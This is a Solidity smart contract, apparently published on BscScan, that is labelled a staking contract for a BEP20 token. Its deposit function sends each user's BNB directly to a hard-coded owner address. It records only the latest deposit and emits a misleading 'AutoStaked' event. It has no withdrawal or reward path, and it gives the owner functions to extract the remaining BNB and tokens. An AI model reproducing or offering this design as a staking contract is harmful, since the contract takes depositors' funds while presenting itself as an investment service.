/**
 *Submitted for verification at BscScan.com on 2022-09-20
*/

pragma solidity ^0.5.10;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

contract MOUNTSTAKING  {
    using SafeMath for uint256;
    IBEP20 public token;

    address payable public owner = 0x8367578061aed64c1f4cf6C0e9C5592C51323173;
    event AutoStaked(address indexed _address, uint256 _amountOfBnb);

    struct User{
        uint256 tokenAmount;
    }

    constructor(IBEP20 _token) public {
        require(_token != IBEP20(address(0)));
        token = _token;
    }

    mapping(address => User) public Users;

    modifier onlyOwner(){
        require(msg.sender == owner, "Owner Rights");
        _;
    }

    function() payable external {}

    function getStakeAmount(address holder) public view returns (uint256) {
        return Users[holder].tokenAmount;
    }

    function deposit()external payable returns (bool){
        require(msg.value > 0, "Select amount first");
        owner.transfer(msg.value);
        Users[msg.sender].tokenAmount = msg.value;
        emit AutoStaked(msg.sender, msg.value);
        return true;
    }

    function bnb_extractor() external onlyOwner {
        uint contractBalance = address(this).balance;
        msg.sender.transfer(contractBalance);
    }

    function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
        token.transfer(_beneficiary, _tokenAmount);
    }

    function transferTokens(uint256 tokens) external onlyOwner {
        _deliverTokens(owner, tokens);
    }
}